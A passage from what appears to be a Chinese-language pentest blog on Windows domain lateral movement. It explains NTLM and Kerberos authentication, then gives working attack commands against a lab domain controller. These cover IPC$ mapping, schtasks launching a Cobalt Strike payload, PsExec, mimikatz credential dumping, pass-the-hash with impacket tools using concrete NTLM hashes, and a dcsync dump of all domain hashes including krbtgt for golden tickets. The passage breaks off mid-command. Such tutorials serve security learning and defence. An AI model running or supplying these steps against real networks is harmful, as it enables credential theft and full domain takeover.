Database</em>，安全账号管理数据库)中。</p><blockquote><p>  SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p></blockquote><p>当用户输入密码进行本地认证的过程中，用户输入的密码将为被转化为 NTLM Hash，然后与SAM中的NTLM Hash进行比较。当用户注销、重启、锁屏后，操作系统会让 <strong>winlogon.exe</strong> 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。<strong>lsass.exe</strong> 是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对SAM数据库比较认证。</p><blockquote><p>  winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p></blockquote><p>Net-NTLM Hash v1的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>Net-NTLM Hash v2的格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><p>客户端发送用户名等身份信息，服务端生成随机16位challenge发给客户端，客户端使用NTLM hash加密challenge发给服务端。服务端通过用户名找到NTLM hash然后加密challenge跟客户端发送过来的比对，比对成功则认证成功。</p><h4 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h4><p>这种情况适用于使用域账号登录的场景，这个时候服务端是没有用户的hash的。所以不一样的地方是服务端会将用户信息、challenge、客户端返回的信息都发给域控，由域控做认证再返回结果。流程图见下图</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093645_6081688d6fe4ca32a240d.png!small" alt="1619093645_6081688d6fe4ca32a240d.png!small?1619093647476"></p><h2 id="2-kerberos认证"><a href="#2-kerberos认证" class="headerlink" title="2.kerberos认证"></a>2.kerberos认证</h2><p>Kerberos认证的是由三方来完成的，他们分别是client、server、KDC(Key Distribution Center密钥分发中心)</p><p>KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。</p><p>其中KDC是由两种服务所构成的：</p><ul><li><p>  AS(Authentication Service)：验证 Client 端的身份，验证通过就会给一张 TGT（Ticket Granting Ticket）票给 Client。</p></li><li><p>  TGS(Ticket Granting Service)：通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票ST（ServiceTicket）也有资料称为 TGS Ticket，为了和 TGS 区分，在这里就用 ST 来说明。</p></li></ul><p>AS是用来为client生成TGT(Ticket Granting Ticket)的，TGS是用来为client生成某个服务的ST的，TGT是用来获取ST的临时凭证，ST是用来访问某种服务所必须使用的票据。</p><p>KDC 服务框架中包含一个krbtgt账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1619093657_60816899201be08a4b1ab.png!small" alt="1619093657_60816899201be08a4b1ab.png!small?1619093659321"></p><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><p><strong>The Authentication Service Exchange</strong>：Client 与 AS 的交互；</p><p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client 与 TGS 的交互；</p><p><strong>The Client/Server Authentication Exchange</strong>：Client 与 Server 的交互。</p><ol><li><p>client与AS：</p><p> client发送： 用户名 + 用户密码加密（用户信息，时间戳等）</p><p> AS：根据用户名找到用户密码，解密出用户信息和事件戳，核实成功后认证成功，然后随机生成一个session key</p><p> AS发送：用户密码加密（session key） + TGT(也就是krbtgt加密（用户信息，session key）)</p><p> 注意：TGT中用户唯一不知道的是krbtgt的密码hash，所以有了这个hash，就可以自己伪造TGT，也就是所谓的<strong>金票据</strong>。</p></li><li><p>client与TGS交互</p><p> client发送：session key加密（用户信息，时间戳等） + 需要访问的服务名 + TGT</p><p> TGS：使用krbtgt密码解密TGT，获得session key 解密出用户信息，与TGS中的用户信息比对。认证成功后生成随机的 server session key</p><p> TGS发送：session key加密（server session key） + ST(也就是对应服务端密码加密（用户信息，server session key）)</p><p> 注意：ST中用户唯一不知道的是server的密码hash，所以有了这个hash，就可以自己伪造ST，也就是所谓的<strong>银票据</strong>。</p></li><li><p>client与server交互</p><p> client发送：server session key加密（用户信息，时间戳等） + ST</p><p> server：使用自己的密码解密ST，获得server session key，然后将server session key解密后获得的用户信息和ST中的用户信息比对，认证成功。</p></li></ol><h2 id="3-PAC-特权属性证书"><a href="#3-PAC-特权属性证书" class="headerlink" title="3.PAC(特权属性证书)"></a>3.PAC(特权属性证书)</h2><p>在 Kerberos 最初设计的几个流程里说明了如何证明 Client 是 Client 而不是由其他人来冒充的，但并没有声明 Client 有没有访问 Server 服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。<br>所以微软为了解决这个问题在实现 Kerberos 时加入了 PAC 的概念，PAC 的全称是 Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而 PAC 就是为了区别不同权限的一种方式。</p><h1 id="7-横向移动总结"><a href="#7-横向移动总结" class="headerlink" title="7.横向移动总结"></a>7.横向移动总结</h1><h2 id="Windows远程连接命令"><a href="#Windows远程连接命令" class="headerlink" title="Windows远程连接命令"></a>Windows远程连接命令</h2><h3 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h3><p>条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.开放了139、445端口；</span><br><span class="line">2.目标开启ipc$文件共享；</span><br><span class="line">3.获取用户账号密码；</span><br></pre></td></tr></table></figure><p>ipc+计划任务恒横向移动：</p><p>（1）首先建立向目标主机的<code>IPC$</code>连接</p><p>（2）命令执行的脚本传到目标主机</p><p>（3）创建计划任务在目标机器上执行命令脚本</p><p>（4）删除<code>IPC$</code>连接</p><p><strong>连接</strong>：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141047308.png" alt="image-20220319141047308"></p><p><strong>映射</strong>：</p><p><code>net use z: \\192.168.188.100\c$ Admin123! /user:Administrator</code>（把目标C盘映射到本地z盘）</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319141844900.png" alt="image-20220319141844900"></p><p><strong>访问/删除路径</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.188.100\c$   #直接访问</span><br><span class="line">net use c: /del                 删除映射的c盘，其他盘类推 </span><br><span class="line">net use * /del                 删除全部,会有提示要求按y确认</span><br></pre></td></tr></table></figure><p><strong>删除IPC连接</strong>：</p><p><code>net use \\192.168.188.100\ipc$ /del</code></p><h3 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h3><blockquote><p>  at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。</p></blockquote><p>at计划命令在实战中主要有两个用处：一是在获取webshell后不能够执行系统命令的情况下可以用at命令将命令执行后写入txt再用type读取，二是利用at计划任务命令上线cs或者msf</p><p>因为at只在2003以下，这里使用win2003（）的机子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.188.100 14:27:00 cmd.exe /c &quot;ipconig &gt; c:\result.txt&quot;</span><br></pre></td></tr></table></figure><p>之后使用type读取</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319143430449.png" alt="image-20220319143430449"></p><p>一定要注意主机的时间，使用<code>net time \\192.168.188.100</code>查看</p><p><strong>删除计划任务</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> <span class="number">1</span> /<span class="keyword">delete</span></span><br></pre></td></tr></table></figure><h3 id="schtash命令"><a href="#schtash命令" class="headerlink" title="schtash命令"></a>schtash命令</h3><p>2008及以上都没at了，使用schtash代替。</p><p>可以直接将cs的exe copy到目标机：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\xxxx\artifact.exe \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span>\c$</span><br></pre></td></tr></table></figure><p>之后使用schtash创建计划任务：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /TN cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> /TR C:\artifact.exe /SC once /ST <span class="number">17</span>:<span class="number">32</span></span><br><span class="line"></span><br><span class="line">/TN 指定任务的名称</span><br><span class="line">/s 指定远程计算机的名称或 IP 地址</span><br><span class="line">/TR 指定任务运行的程序或命令</span><br><span class="line">/SC 指定计划类型。 </span><br><span class="line">/ST 使用<span class="number">24</span>小时时间格式 HH： mm 指定任务的开始时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看帮助</span><br><span class="line">schtasks /create /?</span><br><span class="line"></span><br><span class="line">执行计划任务</span><br><span class="line">schtasks /run /tn cs /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line"></span><br><span class="line">查看运行状态</span><br><span class="line">schtasks /query /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span> | findstr <span class="string">&quot;cs&quot;</span></span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">schtasks /<span class="keyword">delete</span> /F /tn todayfive /s <span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /u <span class="string">&quot;Administrator&quot;</span> /p <span class="string">&quot;Admin123!&quot;</span></span><br><span class="line">/f 禁止显示确认消息。 删除任务但不发出警告</span><br></pre></td></tr></table></figure><h2 id="使用PsExec"><a href="#使用PsExec" class="headerlink" title="使用PsExec"></a>使用PsExec</h2><p>微软自家的，不会被杀</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">tool_download</a></p><p>需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.188.100 -u WIN-4JS3YOGGQ2T\administrator -p Admin123! -s cmd.exe</span><br><span class="line"></span><br><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br></pre></td></tr></table></figure><p>也可以net连上之后psexec：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.188.100\ipc$ Admin123! /user:administrator </span><br><span class="line"></span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 cmd.exe</span><br><span class="line">or</span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 ipconfig</span><br></pre></td></tr></table></figure><p>注意要关UAC或者加注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem</span><br><span class="line">添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1。</span><br></pre></td></tr></table></figure><p>但我一直是拒绝访问，，，，不知道为啥。。。。。</p><h2 id="PTH-Hash传递攻击，pass-the-hash"><a href="#PTH-Hash传递攻击，pass-the-hash" class="headerlink" title="PTH(Hash传递攻击，pass the hash)"></a>PTH(Hash传递攻击，pass the hash)</h2><p><a href="https://xz.aliyun.com/t/8690">Kerberos相关攻击技巧</a></p><p><a href="https://cloud.tencent.com/developer/article/1829649">Hash传递攻击</a></p><p><a href="https://cloud.tencent.com/developer/article/1752168">内网渗透之命令行渗透 - 渗透红队笔记</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），简单地将其传递来进行身份验证，以此来横向访问其他网络系统。</p><p>攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</p><p>工具：</p><blockquote><p>  <a href="https://github.com/maaaaz/impacket-examples-windows">Github</a></p><p>  <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p></blockquote><h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>使用mimikatz抓取密码或者hash，其实如果在域内主机可以获取到明文密码，我们可以使用明文密码进行登录，但是在很多情况下，由于域内密码复杂度要求，我们可能无法获取到域内主机明文密码，这就导致我们必须使用hash传递来获取域控权限。</p><p>需要本地管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  <span class="comment"># 查看是否有debug权限</span></span><br><span class="line">token::elevate    <span class="comment"># 提升到最高权限</span></span><br><span class="line">sekurlsa::logonpasswords full  <span class="comment">#抓取所有的密码,如果密码复杂则只会抓到hash</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318183012610.png" alt="image-20220318183012610"></p><p>查看域控文件目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:administrator /domain:ghost /ntlm:520126a03f5d5a8d836f1c4f34ede7ce</span></span><br><span class="line">user    : administrator</span><br><span class="line">domain  : ghost</span><br><span class="line">program : cmd.exe</span><br><span class="line">impers. : no</span><br><span class="line">NTLM    : 520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">  |  PID  6968</span><br><span class="line">  |  TID  4008</span><br><span class="line">  |  LSA Process is now R/W</span><br><span class="line">  |  LUID 0 ; 22668132 (00000000:0159e364)</span><br><span class="line">  \_ msv1_0   - data copy @ 000001F6C8FFE6F0 : OK !</span><br><span class="line">  \_ kerberos - data copy @ 000001F6C8E5ED28</span><br><span class="line">   \_ des_cbc_md4       -&gt; null</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ *Password replace @ 000001F6C8465DC8 (32) -&gt; null</span><br></pre></td></tr></table></figure><p>会弹出来个cmd，这个cmd是域内主机的cmd，不是域控的cmd。</p><p>可以直接连接该主机、查看目录文件等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接域控：net use \\192.168.188.100</span><br><span class="line">查看文件目录：dir \\192.168.188.100\c$</span><br></pre></td></tr></table></figure><p>查看目标开放的共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;net view \\192.168.188.100</span><br><span class="line">在 \\192.168.188.100 的共享资源</span><br><span class="line">共享名    类型  使用为  注释</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NETLOGON  Disk          Logon server share</span><br><span class="line">SYSVOL    Disk          Logon server share</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>只有域控才会有下面两个共享目录：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON      Disk          Logon server share</span><br><span class="line">SYSVOL        Disk          Logon server share</span><br></pre></td></tr></table></figure><p>删除链接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\Users&gt;net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line">\\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> 已经删除。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>copy 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#把当前机器C盘下的1.txt文件拷贝到目标桌面</span><br><span class="line">copy 1.txt \\192.168.188.100\c$\users\administrator\desktop\</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185354157.png" alt="image-20220318185354157"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 吧目标机器上的pass.txt拷贝到本地</span><br><span class="line">coyp \\192.168.188.100\c$\users\administrator\desktop\pass.txt</span><br></pre></td></tr></table></figure><p>查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标桌面1.txt文件内容</span><br><span class="line">type \\192.168.188.100\c$\users\administrator\desktop\1.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185531211.png" alt="image-20220318185531211"></p><p>除此之外还有psexec，wmiexec，rpcdump等等，（之后再写）</p><p><a href="https://cloud.tencent.com/developer/article/1829649">PTH(Pass The Hash)哈希传递攻击手法与防范</a></p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>这里的和上面的那个psexec不一样，这个是impacket套装里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe Administrator@192.168.188.100 -hashes 00000000000000000000000000000000:520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">or</span><br><span class="line">psexec.exe Administrator@192.168.188.100 -hashes :520126a03f5d5a8d836f1c4f34ede7ce</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319161231967.png" alt="image-20220319161231967"></p><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100 &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160157984.png" alt="image-20220319160157984"></p><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe  -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160656572.png" alt="image-20220319160656572"></p><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><blockquote><p>  WMI以CIMOM为基础，CIMOM即<a href="https://baike.baidu.com/item/%E5%85%AC%E5%85%B1%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9E%8B/2719581">公共信息模型</a><a href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E7%AE%A1%E7%90%86%E5%99%A8/21508570">对象管理器</a>（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和<a href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E7%A8%8B%E5%BA%8F/1265903">脚本程序</a>提供了一个访问操作系统构成单元的公共接口。</p></blockquote><h4 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process list brief</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165203798.png" alt="image-20220319165203798"></p><h4 id="远程创建进程"><a href="#远程创建进程" class="headerlink" title="远程创建进程"></a>远程创建进程</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process call create <span class="string">&quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165338212.png" alt="image-20220319165338212"></p><h4 id="wmiexec-1"><a href="#wmiexec-1" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>上面写过了。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165549388.png" alt="image-20220319165549388"></p><h2 id="PTT-Pass-the-ticket"><a href="#PTT-Pass-the-ticket" class="headerlink" title="PTT(Pass the ticket)"></a>PTT(Pass the ticket)</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>Golden Ticket（下面称为金票）是通过伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p>条件：</p><p>1、域名称 </p><p>2、域的 SID 值 </p><p>3、域的 KRBTGT 账号的 HASH </p><p>4、伪造任意用户名</p><p>得到kratgr的hash：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com /all /csv</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;ghost.com&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">1001    WIN-4JS3YOGGQ2T$        b443a0863dfb6f394b46983d0d795fb6        532480</span><br><span class="line">1104    DM_WIN2003$     13e19dba1a1ad144d9bced3585afa9a9        4096</span><br><span class="line">500     Administrator   520126a03f5d5a8d836f1c4f34ede7ce        512</span><br><span class="line">1000    DC      520126a03f5d5a8d836f1c4f34ede7ce        544</span><br><span class="line">502     krbtgt  a5269d41b184a97adc9b991f2ee21f12        514</span><br><span class="line">1105    DM_WINXP$       5469d97f136d8662f65377f3ea8e4835        528384</span><br><span class="line">1107    yutao   520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1109    yutaowin10      520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1108    DM_WIN10$       bc3746c7020c2c97eac589107a57790f        4096</span><br><span class="line">1110    DM_WIN10_2$     aa5910b813ef7a8784d7522dad99ee07        4096</span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com 